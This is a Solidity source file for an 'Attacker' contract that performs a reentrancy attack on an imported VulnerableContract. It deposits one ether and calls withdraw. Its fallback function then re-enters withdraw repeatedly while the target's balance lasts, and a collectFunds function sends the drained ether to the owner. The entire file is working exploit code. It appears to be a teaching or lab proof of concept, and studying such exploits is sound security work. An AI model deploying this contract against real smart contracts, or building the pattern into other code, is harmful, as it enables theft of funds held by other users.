// Attacker contract
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract Attacker {
  VulnerableContract public vulnerable;
  address public owner;

  // Set the vulnerable contract address in the constructor
  constructor(address _vulnerableAddress) {
    vulnerable = VulnerableContract(_vulnerableAddress);
    owner = msg.sender;
  }

  // Fallback function is called when the contract receives Ether
  fallback() external payable {
    // Re-enter the withdraw function in VulnerableContract
    if (address(vulnerable).balance >= 1 ether) {
      vulnerable.withdraw(1 ether);
    }
  }

  // Function to initiate the attack
  function attack() external payable {
    require(msg.value >= 1 ether, "Need at least 1 ether to attack");

    // Deposit some Ether into the vulnerable contract
    vulnerable.deposit{value: 1 ether}();

    // Start the first withdraw call
    vulnerable.withdraw(1 ether);
  }

  // Function to withdraw stolen funds from this contract to the attacker
  function collectFunds() external {
    require(msg.sender == owner, "Not the owner");
    payable(owner).transfer(address(this).balance);
  }
}
